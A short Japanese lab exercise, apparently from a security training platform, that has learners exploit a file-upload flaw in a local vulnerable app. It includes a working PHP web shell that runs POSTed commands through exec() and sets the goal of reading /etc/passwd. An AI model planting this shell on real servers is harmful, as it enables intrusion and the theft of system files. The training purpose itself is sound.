### 脆弱性の悪用


#### 脆弱なアプリケーションの起動

画面右下のターミナルで`docker-compose`と入力し，アプリケーションを立ち上げましょう．  
その後，画面右上の疑似ブラウザの更新ボタンを押すと脆弱なアプリケーションが表示されます．  

#### 攻撃

このアプリケーションには、ユーザーアイコンをアップロード機能に脆弱性があり、アップロードしたスクリプトファイル(php)が動作してしまいます。
その攻撃を元にPHPファイルを作成し、OSコマンドを実行して/etc/passwdを取得してください。

例
```PHP
$cmd = $_POST['cmd']!=""? $_POST['cmd']:"";
exec($cmd==""?"cd ../ && ls":$cmd, $outs);
echo '<div style="width:500px;height:500px;overflow:scroll;background-color:black;color:white;font-size:10px;">';
foreach ($outs as $key => $out) {
    echo $out.'<br>';
}
echo '</div>';
echo "<form action='evil.php'method='post'><input id='cmd' name='cmd'style='width:463px' type='text'/><input type='submit' style='background-color:black;color:white;'/></form>";
```
